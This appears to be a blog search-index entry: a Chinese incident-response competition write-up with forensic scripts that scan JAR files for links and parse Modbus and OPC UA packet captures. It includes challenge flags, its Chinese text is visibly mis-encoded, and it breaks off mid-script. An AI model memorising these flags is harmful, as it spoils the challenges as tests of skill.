<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>2025å¹´Solaråº”æ€¥å“åº”å…¬ç›Šæœˆèµ›-10æœˆ</title>
    <link href="/2025/10/29/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-10%E6%9C%88/"/>
    <url>/2025/10/29/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-10%E6%9C%88/</url>
    
    <content type="html"><![CDATA[<h1 id="ruoyi"><a href="#ruoyi" class="headerlink" title="ruoyi"></a>ruoyi</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> zipfile<br><span class="hljs-keyword">from</span> pathlib <span class="hljs-keyword">import</span> Path<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_http_links</span>(<span class="hljs-params">text</span>):<br>    pattern = <span class="hljs-string">r&#x27;https?://[^\s&lt;&gt;&quot;&#123;&#125;|\\^`\[\]]+&#x27;</span><br>    <span class="hljs-keyword">return</span> re.findall(pattern, text)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_file_safe</span>(<span class="hljs-params">file_path</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;å°è¯•ä½¿ç”¨å¤šç§ç¼–ç è¯»å–æ–‡ä»¶ï¼Œå¦‚æœå¤±è´¥åˆ™ä½¿ç”¨äºŒè¿›åˆ¶æ–¹å¼&quot;&quot;&quot;</span><br>    encodings = [<span class="hljs-string">&#x27;utf-8&#x27;</span>, <span class="hljs-string">&#x27;latin-1&#x27;</span>, <span class="hljs-string">&#x27;gbk&#x27;</span>, <span class="hljs-string">&#x27;gb2312&#x27;</span>]<br>    <span class="hljs-keyword">for</span> enc <span class="hljs-keyword">in</span> encodings:<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=enc) <span class="hljs-keyword">as</span> f:<br>                <span class="hljs-keyword">return</span> f.read()<br>        <span class="hljs-keyword">except</span> Exception:<br>            <span class="hljs-keyword">continue</span><br>    <span class="hljs-comment"># äºŒè¿›åˆ¶è¯»å–ï¼Œå¿½ç•¥æ— æ³•è§£ç å­—ç¬¦</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            <span class="hljs-keyword">return</span> f.read().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>)<br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">search_file_for_http</span>(<span class="hljs-params">file_path</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;åœ¨å•ä¸ªæ–‡ä»¶ä¸­æœç´¢HTTP/HTTPSé“¾æ¥&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        content = read_file_safe(file_path)<br>        <span class="hljs-keyword">if</span> content:<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">list</span>(<span class="hljs-built_in">set</span>(find_http_links(content)))  <span class="hljs-comment"># å»é‡</span><br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">return</span> []<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_jar</span>(<span class="hljs-params">jar_path, extract_to</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;è§£å‹JARæ–‡ä»¶&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> zipfile.ZipFile(jar_path, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> jar:<br>            jar.extractall(extract_to)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;âŒ è§£å‹å¤±è´¥: <span class="hljs-subst">&#123;jar_path&#125;</span> | <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan_directory_for_jars</span>(<span class="hljs-params">directory</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;æ‰«æç›®å½•ä¸‹æ‰€æœ‰JARæ–‡ä»¶&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> [<span class="hljs-built_in">str</span>(p) <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> Path(directory).rglob(<span class="hljs-string">&quot;*.jar&quot;</span>)]<br><br><span class="hljs-comment"># ----------------- ä¸»é€»è¾‘ -----------------</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">source_dir, output_dir=<span class="hljs-literal">None</span></span>):<br>    source_path = Path(source_dir)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> source_path.exists():<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;âŒ æºç›®å½•ä¸å­˜åœ¨: <span class="hljs-subst">&#123;source_dir&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-keyword">if</span> output_dir <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        output_path = source_path / <span class="hljs-string">&quot;jar_extracted&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        output_path = Path(output_dir)<br>    output_path.mkdir(parents=<span class="hljs-literal">True</span>, exist_ok=<span class="hljs-literal">True</span>)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ğŸ“‚ æºç›®å½•: <span class="hljs-subst">&#123;source_path&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ğŸ“‚ è§£å‹ç›®å½•: <span class="hljs-subst">&#123;output_path&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span>*<span class="hljs-number">50</span>)<br><br>    jar_files = scan_directory_for_jars(source_path)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;âœ… æ‰¾åˆ° <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(jar_files)&#125;</span> ä¸ªJARæ–‡ä»¶\n&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> jar_files:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;âš ï¸  æœªæ‰¾åˆ°JARæ–‡ä»¶&quot;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    results = []<br><br>    <span class="hljs-keyword">for</span> idx, jar_path <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(jar_files, <span class="hljs-number">1</span>):<br>        jar_name = Path(jar_path).name<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[<span class="hljs-subst">&#123;idx&#125;</span>/<span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(jar_files)&#125;</span>] å¤„ç†: <span class="hljs-subst">&#123;jar_name&#125;</span>&quot;</span>)<br><br>        extract_path = output_path / jar_name.replace(<span class="hljs-string">&#x27;.jar&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>        extract_path.mkdir(parents=<span class="hljs-literal">True</span>, exist_ok=<span class="hljs-literal">True</span>)<br><br>        <span class="hljs-keyword">if</span> extract_jar(jar_path, extract_path):<br>            http_found = <span class="hljs-literal">False</span><br>            <span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> extract_path.rglob(<span class="hljs-string">&quot;*&quot;</span>):<br>                <span class="hljs-keyword">if</span> file.is_file():<br>                    links = search_file_for_http(file)<br>                    <span class="hljs-keyword">if</span> links:<br>                        http_found = <span class="hljs-literal">True</span><br>                        rel_file = file.relative_to(extract_path)<br>                        results.append(&#123;<br>                            <span class="hljs-string">&#x27;jar&#x27;</span>: jar_name,<br>                            <span class="hljs-string">&#x27;file&#x27;</span>: <span class="hljs-built_in">str</span>(rel_file),<br>                            <span class="hljs-string">&#x27;links&#x27;</span>: links<br>                        &#125;)<br>                        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;  ğŸ”— <span class="hljs-subst">&#123;rel_file&#125;</span>&quot;</span>)<br>                        <span class="hljs-keyword">for</span> link <span class="hljs-keyword">in</span> links:<br>                            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;      â†’ <span class="hljs-subst">&#123;link&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> http_found:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  â„¹ï¸  æœªæ‰¾åˆ°HTTPé“¾æ¥&quot;</span>)<br>        <span class="hljs-built_in">print</span>()<br><br>    <span class="hljs-comment"># è¾“å‡ºæ±‡æ€»æŠ¥å‘Š</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span>*<span class="hljs-number">50</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ğŸ“Š æœç´¢å®Œæˆæ±‡æ€»&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;æ€»JARæ–‡ä»¶æ•°: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(jar_files)&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;åŒ…å«HTTPé“¾æ¥çš„æ–‡ä»¶æ•°: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(results)&#125;</span>&quot;</span>)<br><br>    report_file = output_path / <span class="hljs-string">&quot;http_links_report.txt&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(report_file, <span class="hljs-string">&#x27;w&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            f.write(<span class="hljs-string">&quot;HTTPé“¾æ¥æœç´¢æŠ¥å‘Š\n&quot;</span>)<br>            f.write(<span class="hljs-string">&quot;=&quot;</span>*<span class="hljs-number">50</span> + <span class="hljs-string">&quot;\n&quot;</span>)<br>            f.write(<span class="hljs-string">f&quot;æ€»JARæ–‡ä»¶æ•°: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(jar_files)&#125;</span>\n&quot;</span>)<br>            f.write(<span class="hljs-string">f&quot;åŒ…å«HTTPé“¾æ¥çš„æ–‡ä»¶æ•°: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(results)&#125;</span>\n\n&quot;</span>)<br>            <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> results:<br>                f.write(<span class="hljs-string">f&quot;\nJAR: <span class="hljs-subst">&#123;r[<span class="hljs-string">&#x27;jar&#x27;</span>]&#125;</span>\n&quot;</span>)<br>                f.write(<span class="hljs-string">f&quot;æ–‡ä»¶: <span class="hljs-subst">&#123;r[<span class="hljs-string">&#x27;file&#x27;</span>]&#125;</span>\n&quot;</span>)<br>                f.write(<span class="hljs-string">&quot;é“¾æ¥:\n&quot;</span>)<br>                <span class="hljs-keyword">for</span> link <span class="hljs-keyword">in</span> r[<span class="hljs-string">&#x27;links&#x27;</span>]:<br>                    f.write(<span class="hljs-string">f&quot;  - <span class="hljs-subst">&#123;link&#125;</span>\n&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ğŸ“ æŠ¥å‘Šå·²ä¿å­˜: <span class="hljs-subst">&#123;report_file&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;âŒ ä¿å­˜æŠ¥å‘Šå¤±è´¥: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br><br><span class="hljs-comment"># ----------------- å‘½ä»¤è¡Œå…¥å£ -----------------</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &lt; <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ç”¨æ³•: python <span class="hljs-subst">&#123;sys.argv[<span class="hljs-number">0</span>]&#125;</span> &lt;jarç›®å½•&gt; [è§£å‹è¾“å‡ºç›®å½•]&quot;</span>)<br>        sys.exit(<span class="hljs-number">1</span>)<br><br>    source = sys.argv[<span class="hljs-number">1</span>]<br>    output = sys.argv[<span class="hljs-number">2</span>] <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">2</span> <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>    main(source, output)<br><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/717675491ba2e936.png"></p><p>æŸ¥çœ‹ framework åŒ… com\ruoyi\framework\interceptor\RepeatSubmitInterceptor.class</p><p><img src="https://img.dkdun.cn/v1/2025/12/92dadbe58ec6daf7.png"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;preRedirect&#125;</span><br></code></pre></td></tr></table></figure><h1 id="å·¥å‚åº”æ€¥"><a href="#å·¥å‚åº”æ€¥" class="headerlink" title="å·¥å‚åº”æ€¥"></a>å·¥å‚åº”æ€¥</h1><h2 id="Q1"><a href="#Q1" class="headerlink" title="Q1"></a>Q1</h2><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode">è°æŠŠæ³µå…³äº†ï¼Ÿ<br>æäº¤æ ¼å¼ï¼šflag&#123;<span class="hljs-number">0</span>xtra<span class="hljs-symbol">nsaction_id_0</span>xfu<span class="hljs-symbol">nction_code_0</span>xcoil_address&#125;<br></code></pre></td></tr></table></figure><p>è„šæœ¬æå–</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> rdpcap, TCP, Raw<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_modbus</span>(<span class="hljs-params">packet</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;è§£æ Modbus TCP æŠ¥æ–‡&quot;&quot;&quot;</span><br>    raw = <span class="hljs-built_in">bytes</span>(packet[Raw].load)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(raw) &lt; <span class="hljs-number">8</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>    trans_id = <span class="hljs-built_in">int</span>.from_bytes(raw[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>], <span class="hljs-string">&quot;big&quot;</span>)<br>    func_code = raw[<span class="hljs-number">7</span>]<br>    <span class="hljs-keyword">return</span> &#123;<br>        <span class="hljs-string">&quot;trans_id&quot;</span>: trans_id,<br>        <span class="hljs-string">&quot;func_code&quot;</span>: func_code,<br>        <span class="hljs-string">&quot;data&quot;</span>: raw[<span class="hljs-number">8</span>:]<br>    &#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_turn_off_pump</span>(<span class="hljs-params">pcap_path</span>):<br>    packets = rdpcap(pcap_path)<br><br>    <span class="hljs-keyword">for</span> pkt <span class="hljs-keyword">in</span> packets:<br>        <span class="hljs-keyword">if</span> TCP <span class="hljs-keyword">in</span> pkt <span class="hljs-keyword">and</span> pkt.haslayer(Raw):<br>            <span class="hljs-keyword">try</span>:<br>                mod = parse_modbus(pkt)<br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> mod:<br>                    <span class="hljs-keyword">continue</span><br><br>                func = mod[<span class="hljs-string">&quot;func_code&quot;</span>]<br>                <span class="hljs-keyword">if</span> func <span class="hljs-keyword">in</span> (<span class="hljs-number">5</span>, <span class="hljs-number">15</span>):  <span class="hljs-comment"># å†™å•çº¿åœˆ or å†™å¤šçº¿åœˆ</span><br>                    data = mod[<span class="hljs-string">&quot;data&quot;</span>]<br>                    coil_addr = <span class="hljs-built_in">int</span>.from_bytes(data[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>], <span class="hljs-string">&quot;big&quot;</span>)<br><br>                    <span class="hljs-comment"># å†™å•çº¿åœˆ (0x05)</span><br>                    <span class="hljs-keyword">if</span> func == <span class="hljs-number">5</span>:<br>                        value = <span class="hljs-built_in">int</span>.from_bytes(data[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>], <span class="hljs-string">&quot;big&quot;</span>)<br>                        <span class="hljs-keyword">if</span> value == <span class="hljs-number">0x0000</span>:  <span class="hljs-comment"># å†™ 0 -&gt; å…³æ³µ</span><br>                            flag = <span class="hljs-string">f&quot;flag&#123;&#123;0x<span class="hljs-subst">&#123;mod[<span class="hljs-string">&#x27;trans_id&#x27;</span>]:04x&#125;</span>_0x<span class="hljs-subst">&#123;func:02x&#125;</span>_0x<span class="hljs-subst">&#123;coil_addr:04x&#125;</span>&#125;&#125;&quot;</span><br>                            <span class="hljs-built_in">print</span>(flag)<br>                            <span class="hljs-keyword">return</span><br><br>                    <span class="hljs-comment"># å†™å¤šçº¿åœˆ (0x0F)</span><br>                    <span class="hljs-keyword">elif</span> func == <span class="hljs-number">15</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(data) &gt; <span class="hljs-number">5</span>:<br>                        qty = <span class="hljs-built_in">int</span>.from_bytes(data[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>], <span class="hljs-string">&quot;big&quot;</span>)<br>                        byte_count = data[<span class="hljs-number">4</span>]<br>                        coil_data = data[<span class="hljs-number">5</span>:<span class="hljs-number">5</span>+byte_count]<br>                        bits = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;b:08b&#125;</span>&#x27;</span>[::-<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> coil_data)<br>                        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(qty):<br>                            <span class="hljs-keyword">if</span> bits[i] == <span class="hljs-string">&#x27;0&#x27;</span>:  <br>                                flag = <span class="hljs-string">f&quot;flag&#123;&#123;0x<span class="hljs-subst">&#123;mod[<span class="hljs-string">&#x27;trans_id&#x27;</span>]:04x&#125;</span>_0x<span class="hljs-subst">&#123;func:02x&#125;</span>_0x<span class="hljs-subst">&#123;coil_addr+i:04x&#125;</span>&#125;&#125;&quot;</span><br>                                <span class="hljs-built_in">print</span>(flag)<br>                                <span class="hljs-keyword">return</span><br>            <span class="hljs-keyword">except</span> Exception:<br>                <span class="hljs-keyword">continue</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] æœªå‘ç°å…³æ³µæ“ä½œã€‚&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &lt; <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ç”¨æ³•: python find_who_turned_off_pump_final.py traffic.pcap&quot;</span>)<br>        sys.exit(<span class="hljs-number">1</span>)<br>    find_turn_off_pump(sys.argv[<span class="hljs-number">1</span>])<br><br></code></pre></td></tr></table></figure><p>flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">0</span>x1a2b_0x05_0x000d&#125;<br></code></pre></td></tr></table></figure><h2 id="Q2"><a href="#Q2" class="headerlink" title="Q2"></a>Q2</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">è¢«å†™å…¥çš„ NodeId<br></code></pre></td></tr></table></figure><p>AIè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> csv<br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> rdpcap, Raw, IP, TCP, UDP<br><br><span class="hljs-comment"># å¸¸è§æ–‡æœ¬ NodeId æ­£åˆ™ï¼ˆns=2;s=..., ns=1;i=123, ns=3;g=..., ns=0;b=...ï¼‰</span><br>RE_NODEID_TEXT = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">rb&#x27;ns=\d+;(?:s=[^\s,;\&quot;\&#x27;]+|i=\d+|g=[0-9A-Fa-f\-]+|b=[A-Za-z0-9+/=]+)&#x27;</span>)<br><span class="hljs-comment"># å¯¹åº”çš„ unicode (UTF-16LE) å½¢å¼ï¼ˆæŸ¥æ‰¾ &quot;n\0s\0=\0digit\0&quot; ä¹‹ç±»ï¼‰</span><br>RE_NODEID_UTF16 = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">rb&#x27;(?:n\0s\0=\0\d\0+\0;\0(?:s\0=\0[^\0,;\&quot;\&#x27;]+\0|i\0=\0\d\0+|g\0=\0[0-9A-Fa-f\-\0]+|b\0=\0[A-Za-z0-9+/=\0]+))&#x27;</span>, re.IGNORECASE)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bytes_to_printable</span>(<span class="hljs-params">b</span>):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">return</span> b.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>)<br>    <span 